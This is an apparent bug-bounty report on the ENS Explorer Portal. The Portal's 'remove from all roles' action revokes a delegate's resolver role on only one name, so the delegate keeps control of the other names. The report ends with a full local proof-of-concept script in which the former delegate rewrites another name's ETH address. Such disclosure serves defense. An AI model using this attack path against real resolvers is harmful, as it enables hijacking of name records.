# 89614 w a critical cross resource role aggregation makes remove user revoke only one name and leaves delegated resolver control

**Submitted on Aug 20th 2026 at 06:22:25 UTC by @Ailenia for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #89614
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters Substituting contract addresses Submitting malicious transactions Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address

## Description

## Brief/Intro

The Explorer Portal groups one account's resolver roles across multiple ENS name resources into a single editable row and tells the connected administrator that removing the row will remove the user "from all roles." Except, the removal transaction contains only the first non-root name. A delegate who was trusted on multiple names retains authority over every omitted name after the administrator signs and completes the advertised removal, and a retained `ROLE_SET_ADDR` lets that delegate replace an omitted name's ETH address.

## Vulnerability Details

The affected asset is `apps/portal` at commit `1c9b47f18fcddd2e864dfe385c4171061c9811ae`. The root cause is a mismatch between an account-level UI model and a resource-scoped authorization API.

### Root cause and affected code

`groupRolesByAccount()` in `apps/portal/src/lib/roles/resolverRoles.ts` keys its map only by the lowercased account. When the same account has role records for different name resources, it appends every source record and decoded bitmap to one group and accumulates every resolved name:

```typescript
const existing = grouped.get(account)

if (existing) {
  existing.roles.push(role)
  existing.decodedRoles.push(...decoded)
  if (resolvedName) existing.resolvedNames.add(resolvedName)
}
```

`ResolverRolesTable.tsx` renders each resulting group as one editable row. In `ResolverRolesSidebar.tsx`, the row still contains all names and the union of all decoded roles, but the transaction resource is reduced to one string:

```typescript
const decodedRoles = (row?.original.decodedRoles ?? []) as ResolverRoleKey[]
const resolvedNames = row?.original.resolvedNames ?? []
const roleName = resolvedNames.find((n) => n !== '(root)') ?? ''
```

The sidebar accurately displays `Roles scoped to alpha.eth, beta.eth`, and the destructive confirmation states `Are you sure you want to remove this user from all roles? This action cannot be undone.` However, `handleRemoveUser()` freezes only `roleName` and the aggregate role list:

```typescript
setPendingAction({
  type: 'remove',
  name: roleName,
  account: selectedAccount,
  roles: decodedRoles,
})
```

Both the gas-estimate path and the submission path pass this incomplete action through `prepareResolverRolesIntent()` and `prepareRevokeResolverRolesTransaction()`. The pinned ENSJS implementation maps a name-scoped revoke to one `authorizeNameRoles(dnsEncode(name), bitmap, account, false)` call. No layer iterates `row.original.roles`, adds the omitted names, or converts the action into a multi-resource batch. The transaction modal displays only `Remove resolver user` and `Remove user <account>`, so it does not disclose which one of the displayed names entered calldata.

The resolver contract correctly applies that call to only `resource(namehash(name), 0)`. Distinct names have distinct resources. Consequently, revoking `alpha.eth` cannot revoke the same account's role on `beta.eth`.

### Preconditions

* The victim administers a PermissionedResolver and previously granted the same delegate a useful role on at least two names served by that resolver. The normal Add User workflow permits this state by granting an account independently on each listed node.
* The delegate is no longer trusted, and the victim uses the Portal's ordinary `Remove user` workflow for the delegate's single aggregated row.
* The attacker controls the former delegate account. This is a user-scoped delegate lifecycle, not access to a project governance or strategist address.

### Attack path

1. The delegate has `ROLE_SET_ADDR` on `alpha.eth` and `beta.eth` under the same PermissionedResolver.
2. The Portal receives two accurate role records and groups them into one account row. The victim opens that row and sees `Roles scoped to alpha.eth, beta.eth`.
3. The victim clicks `Remove user`, accepts removal `from all roles`, and approves the transaction in the connected wallet.
4. The application signs and submits only `authorizeNameRoles(dnsEncode('alpha.eth'), ROLE_SET_ADDR, delegate, false)`.
5. The transaction succeeds, but the delegate's beta role remains active. The Portal's post-success polling may eventually refetch the remaining beta role, but it does not revoke that role.
6. Until the administrator notices the discrepancy and completes a separate beta revocation transaction, the former delegate can call `setAddr(namehash('beta.eth'), attackerAddress)` and replace beta's ETH address. Refetching the role does not prevent or reverse that record change. The same retained-authority pattern applies to other omitted resolver roles and their protected record operations.

## Impact Details

This matches the Critical impact: "Malicious interactions with an already-connected wallet". The bug does not require tampering with the wallet extension:

* the application itself loses part of the represented resource set while constructing the transaction.
* The connected victim approves an application-built removal whose represented scope is every displayed role and name, while the signed resource argument covers only one name.
* The omitted resource is a security-critical authorization parameter

My PoC shows the concrete consequence without assuming later fund theft or permanent compromise: after the advertised all-role removal succeeds, the former delegate retains `ROLE_SET_ADDR` and changes the omitted name's ETH address to an attacker-controlled address. `removeUserMutation.onSuccess` polls for indexer synchronization and invalidates the resolver overview, so the remaining role may become visible again. This recovery signal does not complete the promised removal: The authority remains effective until the victim detects the discrepancy and approves another revocation transaction, and a refetch cannot undo a record change already made with the retained role.

Just to make sure: this is outside the published QA-01 Known Issue. QA-01 covers role combinations that cause later functional errors and explicitly states that a demonstrated security consequence, such as a role combination granting unintended authority, would be a new finding. Here the omitted-resource transaction leaves demonstrated address-record authority active after the UI represented its removal.

## Recommended Remediation

Preserve the resource boundary throughout the view model and transaction. The simplest fix is to render one editable row per `{account, resource}`, so the displayed name, permission bitmap, estimate, and submitted call always refer to the same resource.

If the account-level aggregate view is retained, build a frozen ordered removal action from every entry in `row.original.roles`, preserve each entry's own resource and bitmap, and estimate and submit one call per displayed resource in an atomic batch where possible. Keep root authority distinct from name authority; never infer the target from the first non-root name.

Add regression tests for the same role on two names, disjoint roles on two names, and root plus name. Decode the final requests and assert that the set of revoked resources exactly equals the set represented in the confirmation UI.

## References

* [Pinned `groupRolesByAccount()` source](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/lib/roles/resolverRoles.ts#L168-L220)
* [Pinned resolver roles table source](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesTable.tsx#L90-L137)
* [Pinned resolver roles sidebar source](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L165-L169)
* [Pinned resolver revoke builder](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/helpers/revokeResolverRoles.ts#L29-L74)
* [Official PermissionedResolver name-role semantics](https://github.com/ensdomains/contracts-v2/blob/48b3e2d39513b9dd32ef1850877a29009bc807b9/contracts/src/resolver/PermissionedResolver.sol#L266-L294)
* [ENS audit competition scope](https://immunefi.com/audit-competition/audit-competition-ens/scope/)

## Link to Proof of Concept

<https://gist.github.com/niafreu/3456c22253a855fbdafb65c7f9c5e259>

## Proof of Concept

## Proof of Concept

PoC at <https://gist.github.com/niafreu/3456c22253a855fbdafb65c7f9c5e259> I pasted the main PoC below but the gist gives you the whole thing.

### Prerequisites

* Node.js 20.19 or newer with Corepack.
* Anvil available as `anvil`.
* Solidity compiler 0.8.28 available as `solc`.
* The attached `pocs/finding-ih6288-c001/` directory.

### Setup and exact command

From the directory containing the submitted `pocs/` directory:

```bash
mkdir ens-role-poc
cd ens-role-poc
git clone https://gist.github.com/niafreu/3456c22253a855fbdafb65c7f9c5e259.git pocs/finding-ih6288-c001
git clone https://github.com/immunefi-team/audit-comp-ens.git repos/audit-comp-ens
git -C repos/audit-comp-ens checkout --detach 1c9b47f18fcddd2e864dfe385c4171061c9811ae
test "$(git -C repos/audit-comp-ens rev-parse HEAD)" = "1c9b47f18fcddd2e864dfe385c4171061c9811ae"
corepack pnpm@10.27.0 --dir repos/audit-comp-ens install --frozen-lockfile
repos/audit-comp-ens/apps/portal/node_modules/.bin/vitest run --disableConsoleIntercept --reporter=verbose --config pocs/finding-ih6288-c001/vitest.config.ts
```

The test starts and stops its own Anvil process on `127.0.0.1:18546` and makes no external network request.

### Reproduction steps

1. The test compiles and deploys a minimal local PermissionedResolver fixture and makes the victim its administrator.
2. It uses the pinned Portal's production grant builder and production EOA transport to grant the attacker `ROLE_SET_ADDR` independently on `alpha.eth` and `beta.eth`.
3. It passes the two accurate `{account, resource, roleBitmap}` records through production `buildResourceToNameMap()` and `groupRolesByAccount()`. The result is one row whose displayed scope contains both names.
4. It applies the production sidebar's first-non-root-name expression and constructs the pending removal represented by the UI.
5. It prepares the gas-estimate request with production `prepareResolverRolesIntent()`, rebuilds the submission request with production `prepareRevokeResolverRolesTransaction()`, and asserts that the complete requests are byte-identical.
6. It decodes the request and proves it is only `authorizeNameRoles(dnsEncode('alpha.eth'), 1, attacker, false)` despite the two-name display.
7. It submits the request through production `submitEOATransaction()`. Alpha's role bitmap becomes `0`, while beta's remains `1`.
8. Acting as the former delegate, it changes beta's ETH address to `0x000000000000000000000000000000000000dEaD`.
9. As a negative control, it explicitly revokes beta through the same production builder, confirms beta's bitmap becomes `0`, and confirms the attacker's next address write reverts.

### Expected result

Vitest ends with:

```
Test Files  1 passed (1)
Tests       1 passed (1)
```

The printed evidence includes:

```
lastApplicationDisplay: ["Roles scoped to alpha.eth, beta.eth", "Are you sure you want to remove this user from all roles? ..."]
decodedSignedCall.functionName: authorizeNameRoles
decodedSignedCall.dnsName: 0x05616c7068610365746800
decodedSignedCall.bitmap: 1
decodedSignedCall.enabled: false
revokedResources: [alpha resource]
retainedResources: [beta resource]
retainedRoleBitmap: 1
attackerChangedBetaAddressTo: 0x000000000000000000000000000000000000dEaD
negativeControl: explicit beta revoke blocks the same attacker write
```

### Fixture boundaries

The fixture implements only the external authorization semantics required to isolate the in-scope application defect: DNS namehash, `resource(namehash, 0)`, per-resource role grant/revoke, and an address write gated by `ROLE_SET_ADDR`. The vulnerable grouping, displayed-scope derivation, estimate construction, final calldata construction, and EOA submission all use the pinned production Portal and transaction-manager code. The PoC does not claim a defect in the excluded ENS contracts or indexer.

## PoC code

```typescript
import { execFileSync, spawn, type ChildProcess } from 'node:child_process'
import { readFileSync } from 'node:fs'
import { fileURLToPath } from 'node:url'
import {
  createPublicClient,
  createWalletClient,
  decodeFunctionData,
  defineChain,
  getAddress,
  http,
  namehash,
  parseAbi,
  type Address,
  type Hex,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { submitEOATransaction } from '@ens-apps/transaction-manager/actors/eoa-transport.actor'
import { prepareGrantResolverRolesTransaction } from '@/features/resolver/helpers/grantResolverRoles'
import { prepareResolverRolesIntent } from '@/features/resolver/helpers/prepareResolverRolesIntent'
import { prepareRevokeResolverRolesTransaction } from '@/features/resolver/helpers/revokeResolverRoles'
import {
  buildResourceToNameMap,
  computeNameResource,
  groupRolesByAccount,
} from '@/lib/roles/resolverRoles'

const fixturePath = fileURLToPath(
  new URL('./MockPermissionedResolver.sol', import.meta.url),
)
const rpcPort = process.env.POC_PORT ?? '18546'
const rpcUrl = `http://127.0.0.1:${rpcPort}`
const solcBin = process.env.SOLC_BIN ?? 'solc'
const anvilBin = process.env.ANVIL_BIN ?? 'anvil'
const chain = defineChain({
  id: 11155111,
  name: 'Local Sepolia',
  nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
  rpcUrls: { default: { http: [rpcUrl] } },
})
const victim = privateKeyToAccount(
  '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80',
)
const attacker = privateKeyToAccount(
  '0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d',
)
const maliciousAddress = getAddress(
  '0x000000000000000000000000000000000000dEaD',
)
const alpha = 'alpha.eth'
const beta = 'beta.eth'

const resolverAbi = parseAbi([
  'constructor(address manager)',
  'function authorizeNameRoles(bytes dnsName, uint256 roles, address account, bool enabled)',
  'function roleBitmap(bytes32 resource, address account) view returns (uint256)',
  'function setAddr(bytes32 node, address value)',
  'function addr(bytes32 node) view returns (address)',
])

type CompiledContract = { abi: unknown[]; bytecode: Hex }

const compileFixture = (): CompiledContract => {
  const output = JSON.parse(
    execFileSync(
      solcBin,
      ['--combined-json', 'abi,bin', fixturePath],
      { encoding: 'utf8' },
    ),
  ) as {
    contracts: Record<string, { abi: unknown[]; bin: string }>
  }
  const contract = Object.values(output.contracts)[0]
  if (!contract) throw new Error('Mock resolver compilation produced no contract')
  return { abi: contract.abi, bytecode: `0x${contract.bin}` as Hex }
}

const publicClient = createPublicClient({ chain, transport: http(rpcUrl) })
const victimWallet = createWalletClient({
  account: victim,
  chain,
  transport: http(rpcUrl),
})
const attackerWallet = createWalletClient({
  account: attacker,
  chain,
  transport: http(rpcUrl),
})

const waitForRpc = async () => {
  for (let attempt = 0; attempt < 100; attempt += 1) {
    try {
      await publicClient.getChainId()
      return
    } catch {
      await new Promise((resolve) => setTimeout(resolve, 25))
    }
  }
  throw new Error('Anvil did not start')
}

const requestOf = (intent: ReturnType<typeof prepareRevokeResolverRolesTransaction>) => {
  if (intent.request.type !== 'eoa') throw new Error('Expected EOA request')
  return intent.request
}

const submitProductionRequest = async (
  request: ReturnType<typeof requestOf>,
): Promise<Hex> => {
  const result = await submitEOATransaction({
    request,
    signer: { type: 'eoa', walletClient: victimWallet },
  })
  if (result.isErr()) throw result.error
  return result.value
}

describe('IH6288-C001: resolver role rows collapse distinct resources', () => {
  let anvil: ChildProcess

  beforeAll(async () => {
    anvil = spawn(
      anvilBin,
      ['--host', '127.0.0.1', '--port', rpcPort, '--chain-id', '11155111', '--silent'],
      { stdio: 'pipe' },
    )
    await waitForRpc()
  })

  afterAll(() => {
    anvil.kill('SIGTERM')
  })

  it('signs a one-name revoke after displaying an all-names removal, leaving attacker write authority on the second name', async () => {
    const compiled = compileFixture()
    const deploymentHash = await victimWallet.deployContract({
      abi: compiled.abi,
      bytecode: compiled.bytecode,
      args: [victim.address],
    })
    const deployment = await publicClient.waitForTransactionReceipt({
      hash: deploymentHash,
    })
    const resolverAddress = deployment.contractAddress as Address

    for (const name of [alpha, beta]) {
      const grant = prepareGrantResolverRolesTransaction({
        resolverAddress,
        name,
        account: attacker.address,
        roles: ['ROLE_SET_ADDR'],
        walletClient: victimWallet,
        chainId: chain.id,
      })
      const hash = await submitProductionRequest(requestOf(grant))
      await publicClient.waitForTransactionReceipt({ hash })
    }

    const alphaResource = computeNameResource(alpha) as Hex
    const betaResource = computeNameResource(beta) as Hex
    const grouped = groupRolesByAccount(
      [
        {
          account: attacker.address,
          resource: alphaResource,
          roleBitmap: '1',
        },
        {
          account: attacker.address,
          resource: betaResource,
          roleBitmap: '1',
        },
      ],
      buildResourceToNameMap([{ name: alpha }, { name: beta }]),
    )
    expect(grouped).toHaveLength(1)
    expect(grouped[0]?.resolvedNames).toEqual([alpha, beta])

    const row = grouped[0]
    if (!row) throw new Error('Expected grouped resolver role row')
    const lastScopeDisplay = `Roles scoped to ${row.resolvedNames
      .filter((name) => name !== '(root)')
      .join(', ')}`
    const confirmationDisplay =
      'Are you sure you want to remove this user from all roles? This action cannot be undone.'
    const roleName = row.resolvedNames.find((name) => name !== '(root)') ?? ''
    const pendingAction = {
      type: 'remove' as const,
      name: roleName,
      account: attacker.address,
      roles: row.decodedRoles as ('ROLE_SET_ADDR')[],
    }

    const estimatedIntent = prepareResolverRolesIntent(
      pendingAction,
      resolverAddress,
      { walletClient: victimWallet, chainId: chain.id },
    )
    if (!estimatedIntent) throw new Error('Expected estimated intent')
    const estimatedRequest = requestOf(estimatedIntent)

    const onStartIntent = prepareRevokeResolverRolesTransaction({
      resolverAddress,
      name: pendingAction.name,
      account: pendingAction.account,
      roles: pendingAction.roles,
      walletClient: victimWallet,
      chainId: chain.id,
    })
    const signedRequest = requestOf(onStartIntent)
    expect(signedRequest).toEqual(estimatedRequest)

    const decoded = decodeFunctionData({ abi: resolverAbi, data: signedRequest.data })
    expect(decoded.functionName).toBe('authorizeNameRoles')
    expect(decoded.args?.[0]).toBe('0x05616c7068610365746800')
    expect(decoded.args?.[1]).toBe(1n)
    expect(decoded.args?.[2]).toBe(attacker.address)
    expect(decoded.args?.[3]).toBe(false)
    expect(signedRequest.to).toBe(resolverAddress)
    expect(signedRequest.from).toBe(victim.address)
    expect(signedRequest.chainId).toBe(chain.id)
    expect(signedRequest.value).toBe(0n)

    const signedHash = await submitProductionRequest(signedRequest)
    await publicClient.waitForTransactionReceipt({ hash: signedHash })

    const alphaRoles = await publicClient.readContract({
      address: resolverAddress,
      abi: resolverAbi,
      functionName: 'roleBitmap',
      args: [alphaResource, attacker.address],
    })
    const betaRoles = await publicClient.readContract({
      address: resolverAddress,
      abi: resolverAbi,
      functionName: 'roleBitmap',
      args: [betaResource, attacker.address],
    })
    expect(alphaRoles).toBe(0n)
    expect(betaRoles).toBe(1n)

    const attackHash = await attackerWallet.writeContract({
      address: resolverAddress,
      abi: resolverAbi,
      functionName: 'setAddr',
      args: [namehash(beta), maliciousAddress],
    })
    await publicClient.waitForTransactionReceipt({ hash: attackHash })
    const compromisedAddress = await publicClient.readContract({
      address: resolverAddress,
      abi: resolverAbi,
      functionName: 'addr',
      args: [namehash(beta)],
    })
    expect(compromisedAddress).toBe(maliciousAddress)

    const negativeControl = prepareRevokeResolverRolesTransaction({
      resolverAddress,
      name: beta,
      account: attacker.address,
      roles: ['ROLE_SET_ADDR'],
      walletClient: victimWallet,
      chainId: chain.id,
    })
    const negativeHash = await submitProductionRequest(requestOf(negativeControl))
    await publicClient.waitForTransactionReceipt({ hash: negativeHash })
    expect(
      await publicClient.readContract({
        address: resolverAddress,
        abi: resolverAbi,
        functionName: 'roleBitmap',
        args: [betaResource, attacker.address],
      }),
    ).toBe(0n)
    await expect(
      attackerWallet.writeContract({
        address: resolverAddress,
        abi: resolverAbi,
        functionName: 'setAddr',
        args: [namehash(beta), victim.address],
      }),
    ).rejects.toThrow(/MISSING_ROLE_SET_ADDR/)

    console.log(
      JSON.stringify(
        {
          candidate: 'IH6288-C001',
          lastApplicationDisplay: [lastScopeDisplay, confirmationDisplay],
          estimatedRequest: {
            from: estimatedRequest.from,
            to: estimatedRequest.to,
            value: estimatedRequest.value.toString(),
            chainId: estimatedRequest.chainId,
            data: estimatedRequest.data,
          },
          signedRequest: {
            from: signedRequest.from,
            to: signedRequest.to,
            value: signedRequest.value.toString(),
            chainId: signedRequest.chainId,
            data: signedRequest.data,
          },
          decodedSignedCall: {
            functionName: decoded.functionName,
            dnsName: decoded.args?.[0],
            bitmap: decoded.args?.[1]?.toString(),
            account: decoded.args?.[2],
            enabled: decoded.args?.[3],
          },
          displayedResources: [alphaResource, betaResource],
          revokedResources: [alphaResource],
          retainedResources: [betaResource],
          retainedRoleBitmap: betaRoles.toString(),
          attackerChangedBetaAddressTo: compromisedAddress,
          negativeControl: 'Explicitly revoking beta.eth cleared its role and made the same attacker write revert.',
        },
        null,
        2,
      ),
    )
  })
})
```
